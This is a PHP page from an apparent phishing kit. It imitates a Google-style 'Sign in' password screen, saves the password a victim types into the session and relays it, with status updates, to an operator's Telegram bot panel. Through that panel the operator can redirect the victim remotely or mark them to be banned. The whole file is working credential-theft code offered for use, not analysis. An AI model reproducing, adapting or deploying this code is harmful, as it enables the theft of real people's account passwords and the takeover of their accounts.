<?php
// Start session only if not already started
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
ob_start();

include_once(__DIR__ . '/../includes/php/error_check.php');

if (!isset($_SESSION['step-1']) || isset($_SESSION['404-blocked']) || isset($_SESSION['complete'])) {
    header("HTTP/1.0 404 Not Found");
    exit();
}

require_once(__DIR__ . '/../includes/php/detect.php');   // includes checkCommand()
require_once(__DIR__ . '/../includes/php/config.php');
require(__DIR__ . '/../includes/php/bot_api.php');
require(__DIR__ . '/../includes/php/bot_reply.php');
require_once(__DIR__ . '/../includes/php/buttons.php');

// -------------------------------------------------------------------
// Check for pending command from the Telegram panel
// -------------------------------------------------------------------
$target = checkCommand();
if ($target) {
    if (strpos($target, '..') === 0 || strpos($target, '/') === 0) {
        header('Location: ' . $target);
    } else {
        header('Location: ./' . $target);
    }
    exit();
}

// -------------------------------------------------------------------
// Normal flow (unchanged)
// -------------------------------------------------------------------
if (!isset($_SESSION['step-3'])) $_SESSION['step-3'] = true;

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (!empty($_POST['pwd'])) {
        if (!isset($_SESSION['pwd_counter'])) $_SESSION['pwd_counter'] = 0;
        if (isset($_SESSION['pwd_err'])) unset($_SESSION['pwd_err']);

        $_SESSION['password'] = $_POST['pwd'];
        $_SESSION['pwd_counter']++;

        if ($config['panel'] == 'live') {
            $buttons = getButtons('password', $_SESSION['unique_id']);
            $redirect_to = 'process.php?for=password';
        } else {
            $buttons = getButtons('kick_ban', $_SESSION['unique_id']);
            $redirect_to = 'complete.php';
        }

        $activity['status'] = '🟢';
        $activity['step'] = '👁️ Proccessing';

        include(__DIR__ . '/../includes/php/texts.php');

        $status = bot_api('editMessageText', $message, $buttons);
        if (!bot_api_telegram_ok($status)) {
            die('{"error":true, "description": "telegram bot api"}');
        }

        $step = 2;
        require(__DIR__ . '/../includes/php/logs_text.php');

        bot_reply('🔔🔑');

        header('location: ' . $redirect_to);
        exit();
    }
} else {
    $buttons = getButtons('kick_ban', $_SESSION['unique_id']);;

    $activity['status'] = '🟢';
    $activity['step'] = '👁️ Welcome - Enter your password';

    include(__DIR__ . '/../includes/php/texts.php');

    bot_api('editMessageText', $message, $buttons);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in</title>
    <link rel="stylesheet" href="css/index.css">
    <script src="js/jquery-3.6.0.min.js"></script>
    <link rel="shortcut icon" href="media/7611770.png" type="image/x-icon">
</head>
<body>
    <?php panel_debug_box(); ?>

    <?php $start_html = TRUE; require_once(__DIR__ . '/html/start.php'); ?>
                                <div class="ObDc3 ZYOIke 0-7-15-20 0-6-14-19">
                                    <h1 class="vAV9bf 0-8-20-21 0-7-19-20" id="headingText"><span class="0-9-21-22 0-8-20-21">Welcome</span></h1>
                                    <div class="SOeSgb">
                                        <div class="Ahygpe m8wwGd EPPJc cd29Sd xNLKcb" tabindex="0" role="link">
                                           <div class="HOE91e">
                                              <div class="JQ5tlb" aria-hidden="true">
                                                 <svg aria-hidden="true" class="Qk3oof" fill="currentColor" focusable="false" width="48px" height="48px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
                                                 </svg>
                                              </div>
                                           </div>
                                           <div class="IxcUte" translate="no"><?php if(isset($_SESSION['username'])) echo $_SESSION['username']; ?></div>
                                           <div class="JCl8ie">
                                              <svg aria-hidden="true" class="Qk3oof u4TTuf" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                                 <path d="M7 10l5 5 5-5z"></path>
                                              </svg>
                                           </div>
                                        </div>
                                     </div>
                                </div>
                            </div>
                            <div class="UXFQgc 0-6-14-25 0-5-13-24">
                                <div class="qWK5J 0-7-25-26 0-6-24-25">
                                    <div class="xKcayf 0-8-26-27 0-7-25-26">
                                        <div class="AcKKx 0-9-27-28 0-8-26-27">
                                            <form method="post" novalidate="" class="0-10-28-29 0-9-27-28">
                                                <span class="0-11-29-30 0-10-28-29">
                                                    <section class="Em2Ord 0-12-30-31 0-11-29-30">
                                                        <header class="vYeFie 0-13-31-32 0-12-30-31" aria-hidden="true"></header>
                                                        <div class="yTaH4c 0-13-31-33 0-12-30-32">
                                                            <div class="0-14-33-34 0-13-32-33">
                                                                <div class="AFTWye vEQsqe 0-15-34-35 0-14-33-34">
                                                                    <div id="userLabel" class="rFrNMe X3mtXb UOsO2 ToAxb zKHdkd sdJrJc Tyc9J">
                                                                        <div class="aCsJod oJeWuf 0-17-36-37 0-16-35-36">
                                                                            <div class="aXBtI Wic03c 0-18-37-38 0-17-36-37">
                                                                                <div class="Xb9hP 0-19-38-39 0-18-37-38">
                                                                                    <input type="password" class="whsOnd zHQkBf 0-20-39-40 0-19-38-39" autocomplete="off" spellcheck="false" tabindex="0" name="pwd" value="" autocapitalize="none" id="pwd" dir="ltr">
                                                                                    <div class="AxOyFc snByac 0-20-39-41 0-19-38-40" aria-hidden="true">Enter your password</div>
                                                                                </div>
                                                                                <div class="i9lrp mIZh1c 0-19-38-42 0-18-37-41"></div>
                                                                                <div class="OabDMe cXrdqd Y2Zypf 0-19-38-43 0-18-37-42" id="style-egogs"></div>
                                                                            </div>
                                                                        </div>

                                                                        <div class="LXRPh 0-17-36-44 0-16-35-43">
                                                                            <div class="ovnfwe Is7Fhb 0-18-44-45 0-17-43-44"></div>
                                                                            <div id="errorUsername" class="dEOOab RxsGPe 0-18-44-46 0-17-43-45 <?php if(!isset($_SESSION['pwd_err'])) { echo 'hidden'; } ?>" aria-atomic="true" aria-live="assertive">
                                                                                <div class="Ekjuhf Jj6Lae ">
                                                                                    <span class="AfGCob">
                                                                                    <svg aria-hidden="true" class="Qk3oof xTjuxe" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                                                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
                                                                                    </svg>
                                                                                    </span>
                                                                                    Enter a password
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div class="v8aRxf">
                                                                            <div class="myYH1 g9Mx QkTfte">
                                                                               <div class="Hy62Fc">
                                                                                  <div class="sfqPrd rBUW7e">
                                                                                     <div class="QTJzre NEk0Ve">
                                                                                        <div class="uxXgMe">
                                                                                           <div class="VfPpkd-dgl2Hf-ppHlrf-sM5MNb">
                                                                                              <div class="VfPpkd-MPu53c VfPpkd-MPu53c-OWXEXe-dgl2Hf Ne8lhe swXlm az2ine lezCeb kAVONc VfPpkd-MPu53c-OWXEXe-mWPk3d show-hide">
                                                                                                 <input class="VfPpkd-muHVFf-bMcfAe" type="checkbox" >
                                                                                                 <div class="VfPpkd-YQoJzd">
                                                                                                    <svg aria-hidden="true" class="VfPpkd-HUofsb" viewBox="0 0 24 24">
                                                                                                       <path class="VfPpkd-HUofsb-Jt5cK" fill="none" d="M1.73,12.91 8.1,19.28 22.79,4.59"></path>
                                                                                                    </svg>
                                                                                                    <div class="VfPpkd-SJnn3d"></div>
                                                                                                 </div>
                                                                                                 <div class="VfPpkd-OYHm6b"></div>
                                                                                                 <div class="VfPpkd-sMek6-LhBDec"></div>
                                                                                              </div>
                                                                                           </div>
                                                                                        </div>
                                                                                        <div class="gyrWGe">
                                                                                           <div  class="jOkGjb">
                                                                                              <div  id="selectionc1" class="dJVBl wIAG6d" >Show password</div>
                                                                                           </div>
                                                                                           <div jsname="ij8cu" class="RAvnDd">
                                                                                              <div  class="dJVBl wIAG6d"></div>
                                                                                           </div>
                                                                                        </div>
                                                                                     </div>
                                                                                  </div>
                                                                               </div>
                                                                               <div class="O6yUcb">
                                                                                  <div></div>
                                                                               </div>
                                                                            </div>
                                                                         </div>
                                                                    </div>
                                                                </div>
                                                                <div class="dMNVAe 0-15-34-47 0-14-33-46" aria-live="assertive"></div>
                                                         
                                                            </div>
                                                            <div class="dgb5Cf 0-14-33-77 0-13-32-76"></div>
                                                            <div class="VfPpkd-RLmnJb 0-13-32-78 0-12-31-77"></div>
                                                        </div>
                                                        <footer class="RY3tic 0-12-30-79 0-11-29-78"></footer>
                                                    </section>
                                                </span>
                                            </form>
                                            
                                        </div>
                                       
                                    </div>
                                </div>
                            </div>
                            <div class="JYXaTc 0-6-14-88 0-5-13-87">
                                <div class="O1Slxf 0-7-88-89 0-6-87-88">
                                    <div class="TNTaPb 0-8-89-90 0-7-88-89">
                                        <div class="XjS9D TrZEUc 0-9-90-91 0-8-89-90" id="identifierNext">
                                            <div class="VfPpkd-dgl2Hf-ppHlrf-sM5MNb 0-10-91-92 0-9-90-91">
                                                <button id="nextTo" class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b 0-11-92-93 0-10-91-92" type="submit">
                                                    <div class="VfPpkd-Jh9lGc 0-12-93-94 0-11-92-93"></div>
                                                    <div class="VfPpkd-J1Ukfc-LhBDec 0-12-93-95 0-11-92-94"></div>
                                                    <div class="VfPpkd-RLmnJb 0-12-93-96 0-11-92-95"></div><span class="VfPpkd-vQzf8d 0-12-93-97 0-11-92-96">Next</span>
                                                </button></div>
                                        </div>
                                    </div>
                                    <div class="FO2vFd 0-8-89-98 0-7-88-97">
                                        <div class="n3Clv 0-9-98-99 0-8-97-98">
                                            <div class="VfPpkd-xl07Ob-XxIAqe-OWXEXe-oYxtQd XjS9D 0-10-99-100 0-9-98-99">
                                                <div class="0-11-100-101 0-10-99-100">
                                                    <div class="VfPpkd-dgl2Hf-ppHlrf-sM5MNb 0-12-101-102 0-11-100-101">
                                                        <button class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-dgl2Hf ksBjEc lKxP2d LQeN7 BqKGqe eR0mzb TrZEUc J7pUA 0-13-102-103 0-12-101-102" type="button">
                                                            <div class="VfPpkd-Jh9lGc 0-14-103-104 0-13-102-103"></div>
                                                            <div class="VfPpkd-J1Ukfc-LhBDec 0-14-103-105 0-13-102-104"></div>
                                                            <div class="VfPpkd-RLmnJb 0-14-103-106 0-13-102-105"></div><span class="VfPpkd-vQzf8d 0-14-103-107 0-13-102-106">Forgot password?</span>
                                                        </button>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
        <?php $footer_html = TRUE; require_once(__DIR__ . '/html/footer.php'); ?>
    <script src="js/pwd.js"></script>
</body>
</html>